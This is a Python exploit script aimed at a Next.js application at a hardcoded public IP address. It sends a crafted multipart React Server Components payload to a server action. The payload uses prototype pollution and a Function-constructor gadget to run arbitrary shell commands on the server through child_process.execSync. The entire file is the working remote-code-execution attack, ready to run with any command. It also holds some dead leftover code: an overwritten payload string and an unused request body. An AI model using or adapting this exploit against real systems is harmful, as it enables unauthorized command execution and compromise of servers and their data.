import urllib.request, uuid, sys

TARGET = "http://18.215.143.250:3000/"
ACTION = "40881a01be516941afc21e3145707ceff4a34545af"  # searchStocks

cmd = sys.argv[1] if len(sys.argv) > 1 else "id"

# JS executed server-side via the Function constructor gadget
js_code = (
    "try{process.mainModule.require('child_process')"
    ".execSync(" + repr(cmd).replace("'", '"', 2) + ")}catch(e){try{"
    "process.mainModule.require('child_process')"
    ".execSync(" + repr(cmd).replace("'", '"', 2) + ")}catch(_){}}"
)
# simpler: just build with double quotes
js_code = 'process.mainModule.require(\'child_process\').execSync(%s)' % __import__('json').dumps(cmd)

# field 0: fake Chunk with malicious _response
field0 = (
    '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
    '"value":"{\\"then\\":\\"$B1337\\"}",'
    '"_response":{"_prefix":' + __import__('json').dumps(js_code) + ','
    '"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
)
field1 = '"$@0"'
field2 = '[]'

boundary = "----r2s" + uuid.uuid4().hex
body = (
    f'------r2sBOUNDARY\r\n'
).encode()
parts = []
for name, val in [("0", field0), ("1", field1), ("2", field2)]:
    parts.append(
        f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{val}\r\n'
    )
parts.append(f'--{boundary}--\r\n')
data = "".join(parts).encode()

req = urllib.request.Request(TARGET, method="POST", data=data, headers={
    "Next-Action": ACTION,
    "Content-Type": f"multipart/form-data; boundary={boundary}",
})
try:
    r = urllib.request.urlopen(req, timeout=15)
    print("STATUS:", r.status)
    print(r.read().decode(errors="replace")[:2000])
except urllib.error.HTTPError as e:
    print("HTTPError", e.code, e.read().decode(errors="replace")[:2000])
except Exception as e:
    print("ERR", type(e).__name__, e)
